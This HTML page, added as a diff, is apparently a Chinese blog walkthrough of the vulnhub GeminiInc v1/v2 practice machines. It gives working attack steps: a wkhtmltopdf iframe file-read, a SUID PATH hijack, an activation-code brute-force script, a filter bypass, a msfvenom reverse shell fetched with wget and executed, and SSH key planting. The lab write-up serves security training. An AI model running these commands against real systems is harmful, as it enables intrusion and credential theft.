@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          vulnhub-GeminiInc - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/09/vulnhub-GeminiInc/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#vulnhub" title="vulnhub">vulnhub</a>
+                        
+                          <a class="tag" href="/tags/#练习记录" title="练习记录">练习记录</a>
+                        
+                          <a class="tag" href="/tags/#渗透测试" title="渗透测试">渗透测试</a>
+                        
+                    </div>
+                    <h1>vulnhub-GeminiInc</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-09-14
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近和组内大佬一起刷的vulnhub，<code>GeminiInc</code>有v1和v2两个版本，感觉有很多新奇的东西，遂单独拿出来记录一下</p>
+<h1 id="GeminiInc-V1"><a href="#GeminiInc-V1" class="headerlink" title="GeminiInc V1"></a>GeminiInc V1</h1><h2 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h2><p><code>arp-scan -l</code>探测一手ip信息，检测到靶机ip为<code>192.168.85.142</code></p>
+<p>nmap探测一波端口信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -T4 -A -v 192.168.85.142</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/1.png" alt></p>
+<p>开了常规的<code>22</code>和<code>80</code>端口</p>
+<h2 id="web-attack"><a href="#web-attack" class="headerlink" title="web attack"></a>web attack</h2><p>访问80端口后是个监听的目录，只有一个<code>test2</code>目录，进去就是了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/2.png" alt></p>
+<p>给出了一个建站模板的github地址</p>
+<p>分析一波之后可以在<code>install.php</code>中看到默认的管理员账号密码</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/3.png" alt></p>
+<p>可以尝试用这个默认的管理员账号密码登录一下，发现刚好可以登录！</p>
+<p>登录之后可以看到有两个功能模块，修改资料和导出资料</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/4.png" alt></p>
+<p>导出的资料就是个人界面的一个pdf</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/5.png" alt></p>
+<p>在二进制流中可以发现是用<code>wkhtmltopdf</code>生成的pdf文件</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/6.png" alt></p>
+<p>在修改资料中我们可以完全控制的有一个<code>display name</code>字段，尝试插入一些<code>script</code>字段发现也可以成功插入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/7.png" alt></p>
+<p>这样的话，感觉接下来应该是插入一些特殊的标签，来攻击靶机</p>
+<p>但是，我尝试了所有我能想到的攻击方式，却起不了一点作用，于是看了下别人的writeup</p>
+<p>首先现在自己的www目录下写入这样一个php文件，</p>
+<p>1.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename = $_GET[<span class="string">'file'</span>];</span><br><span class="line">header(<span class="string">"Location: file://$filename"</span>);</span><br></pre></td></tr></table></figure>
+<p>然后在<code>display name</code>字段中插入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://192.168.85.134/1.php?file=/etc/passwd"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">1220</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>导出pdf之后，就能看到，读取出了靶机中的<code>/etc/passwd</code>文件</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/8.png" alt></p>
+<p>至于具体原理，可以看<a href="https://github.com/wkhtmltopdf/wkhtmltopdf/issues/3570" target="_blank" rel="noopener">https://github.com/wkhtmltopdf/wkhtmltopdf/issues/3570</a></p>
+<p>应该是出题人自己挖的一个0day，只能说太强了orz</p>
+<p>这样的话我们就可以进一步读取<code>gemini1</code>用户<code>/home/gemini1/.ssh/id_rsa</code>文件，来通过私钥登录靶机</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/9.png" alt></p>
+<p>这里直接在linux上通过<code>ssh -i</code>方式登录似乎会有一点格式问题，但是通过xshell导入私钥文件登录就不会出现问题</p>
+<h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>一般低权限登录进去首先就是查看下系统版本，看看有没有什么能提权的脚本</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/10.png" alt></p>
+<p>比较尴尬的就是，linux版本相当高了，找了半天没有找到对应版本的提权，稍微看了下writeup是通过suid提权</p>
+<blockquote>
+<p><strong>SUID</strong>（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。</p>
+</blockquote>
+<p>具体原理可以参照下 <a href="https://www.anquanke.com/post/id/86979" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86979</a></p>
+<p>查看一下具有SUID或4000权限的文件。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/11.png" alt></p>
+<p>运行一下可以发现这里面运行了<code>date</code>命令</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/12.png" alt></p>
+<p>这个文件的所有者为<code>root</code>，这样我们就可以修改环境变量中的<code>date</code>命令来以root的身份执行想要执行的代码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo "/bin/sh" &gt; date</span><br><span class="line">chmod 777 date</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">/usr/bin/listinfo</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/13.png" alt></p>
+<p>这样就借助suid的权限切换，成功获得到了root权限，最后的flag</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/14.png" alt></p>
+<h1 id="GeminiInc-V2"><a href="#GeminiInc-V2" class="headerlink" title="GeminiInc V2"></a>GeminiInc V2</h1><h2 id="主机探测-1"><a href="#主机探测-1" class="headerlink" title="主机探测"></a>主机探测</h2><p>虽然说V2是V1的升级版，但是似乎没有太大的关系，一开始还是一波ip探测和nmap的端口扫描</p>
+<p>还是常规的22和80，这里有一个比较重要的点就是目录扫描</p>
+<p>在实际的跳转链接中，就只有<code>index.php</code>和<code>login.php</code>两个和界面，所以需要一个比较全的字典来扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.85.140 SVNDigger/all.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/15.png" alt></p>
+<p>两个比较重要的文件就是<code>activate.php</code>和<code>registration.php</code></p>
+<h2 id="用户登录"><a href="#用户登录" class="headerlink" title="用户登录"></a>用户登录</h2><p>在<code>registration.php</code>中可以申请一个用户</p>
+<p>注册完之后会有提示说需要一个六位数的邀请码</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/16.png" alt></p>
+<p>在激活页面<code>activate.php</code>中需要输入激活用户的id，就可以通过访问<code>My Profile</code>后在url处获取用户id</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/17.png" alt></p>
+<p>至于六位数的邀请码，这个可能需要写一个脚本来爆破，由于六位确实有点长，出题人也只给了一个三位数值的六位数邀请码，方便爆破</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">"http://192.168.85.140/activate.php"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000</span>):</span><br><span class="line">		l = len(str(i))</span><br><span class="line">		<span class="keyword">if</span> l&lt;<span class="number">6</span>:	</span><br><span class="line">			<span class="keyword">yield</span> <span class="string">'0'</span>*(<span class="number">6</span>-l)+str(i)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">yield</span> str(i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">()</span>:</span></span><br><span class="line">	cookies = dict(PHPSESSID=<span class="string">"6bc1s35thd0glrft571gfud8c0"</span>)</span><br><span class="line">	r = requests.get(url, cookies=cookies)</span><br><span class="line"></span><br><span class="line">	token = re.search(<span class="string">r"[0-9a-f]&#123;40&#125;"</span>, r.text)</span><br><span class="line">	<span class="keyword">if</span> token <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">		<span class="keyword">return</span> token.group(<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">raise</span> ValueError(<span class="string">"can not find token"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(code)</span>:</span></span><br><span class="line">	data = dict(userid=<span class="string">"17"</span>,activation_code=code,token=get_token())</span><br><span class="line">	cookies = dict(PHPSESSID=<span class="string">"6bc1s35thd0glrft571gfud8c0"</span>)</span><br><span class="line">	r = requests.post(url , data=data, proxies = &#123;</span><br><span class="line">	<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">	<span class="string">"https"</span>: <span class="string">"http://127.0.0.1:8080"</span>&#125;, cookies=cookies)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> r.status_code == <span class="number">403</span>:</span><br><span class="line">		print(<span class="string">'[&#123;&#125;] =&gt; &#123;&#125;'</span>.format(r.status_code, code))</span><br><span class="line">		<span class="comment"># print(r.headers)</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(<span class="string">'[&#123;&#125;] =&gt; &#123;&#125;'</span>.format(r.status_code, code))</span><br><span class="line">		exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> code <span class="keyword">in</span> get_code():</span><br><span class="line">	submit(code)</span><br></pre></td></tr></table></figure>
+<p>在<code>000511</code>的时候就可以确认成功登录</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/18.png" alt></p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>进去之后，试了一下V1的常规操作，发现已经对html字符进行了实体编码</p>
+<p>然后在查看源代码的时候无意中看到了被注释的密码哈希</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/19.png" alt></p>
+<p>这样，我们访问<code>/profile.php?u=1</code>就可以或得到管理员的密码哈希</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/20.png" alt></p>
+<p>在管理员登录后台中就多了一个<code>Admin Panel</code>模块里面有<code>Execute Command</code>，可是访问的时候却被禁止了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/21.png" alt></p>
+<p>用burp拦截包之后可以看到是ip被禁止了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/22.png" alt></p>
+<p>没想到设置了一波ctf中最常见的XFF就成功登录进去了</p>
+<p>尝试执行了一些命令，发现<code>&lt;</code>，<code>&gt;</code> ，<code>|</code>,<code>\</code>还有空格一些符号被禁止了</p>
+<p>这样的话空格可以用tab键来替代，然后尝试执行shell反弹</p>
+<p>在本地用<code>msfvenom</code>生成一个反弹脚本，放在www目录下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.85.134 LPORT=8888 -f elf -o rev</span><br></pre></td></tr></table></figure>
+<p>并监听本地8888端口</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp <span class="number">8888</span></span><br></pre></td></tr></table></figure>
+<p>然后在靶机中下载该文件并执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget	-O	/tmp/rev	192.168.85.134/rev</span><br><span class="line">chmod	777	/tmp/rev</span><br><span class="line">/tmp/rev</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/23.png" alt></p>
+<p>此时shell就反弹到了kali中，但是是一个交互性极差的shell，所以尝试写入私钥通过私钥登录</p>
+<p>在本地<code>ssh-keygen -t rsa</code>后，将<code>/root/.ssh/id_rsa_pub</code>中的值放入靶机中的<code>/home/gemini1/.ssh/authorized_keys</code>中</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /home/gemini1</span><br><span class="line">mkdir .ssh</span><br><span class="line">echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7/vRIIw5g42JZpNFiZ96w2aRZhEzYQclqXMaw0j8Me7oPh8EGrmzYNz7fNUoUtkg8ebcGRHAA1zfpyHlL/A1BIqiGIvYtq/Xy+g9Zkle6l4zMxvwDfnfrqoyrJLYpxLh8NjzqkO2wWOoFJYNg1QCUXAvkiaZgoyJXUiUdP6ZPk0a5HGDEoZNCxYMo7QnxMAfdo24Qo+rzDrimbUMkXe76w2xxi1YhulVFGdX8daiG8X/oNInSWHuyOD9Q5DRpgjv5MPY4exTiVgDA9l2gn/Qk9ZlOnC0YxZXgZZxzJBH2rRGeCt+xjV13IQ0sFmIh3LenfM7RcvBof6P58WBiS2Cv root@kali</span><br><span class="line">" &gt; /home/gemini1/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+<p>然后在kali中<code>ssh -i id_rsa gemini1@192.168.85.140</code>链接即可</p>
+<h2 id="提权权限"><a href="#提权权限" class="headerlink" title="提权权限"></a>提权权限</h2><p>和之前的V1一样，依旧是版本过高没有现成的提权脚本，看了开启的服务，有一个以roott权限运行的redis</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/24.png" alt></p>
+<p>那就尝试一下常规的redis未授权访问的套路，可是似乎是已授权的</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/25.png" alt></p>
+<p>最后在搜索引擎的帮助下，在配置文件中找到了redis密码</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/26.png" alt></p>
+<p>然后就改公钥走一波</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/27.png" alt></p>
+<p>私钥登录，cat flag</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-GeminiInc/28.png" alt></p>
+<h1 id="Reference-Links"><a href="#Reference-Links" class="headerlink" title="Reference Links"></a>Reference Links</h1><p><a href="https://hackso.me/gemini-inc-1-walkthrough/" target="_blank" rel="noopener">https://hackso.me/gemini-inc-1-walkthrough/</a></p>
+<p><a href="https://hackso.me/gemini-inc-v2-walkthrough/" target="_blank" rel="noopener">https://hackso.me/gemini-inc-v2-walkthrough/</a></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/09/ThinkPHP-漏洞分析集合/" data-toggle="tooltip" data-placement="top" title="ThinkPHP 漏洞分析集合">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/09/vulnhub-练习记录/" data-toggle="tooltip" data-placement="top" title="vulnhub 练习记录">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#vulnhub" title="vulnhub">vulnhub</a>
+                        
+                          <a class="tag" href="/tags/#练习记录" title="练习记录">练习记录</a>
+                        
+                          <a class="tag" href="/tags/#渗透测试" title="渗透测试">渗透测试</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
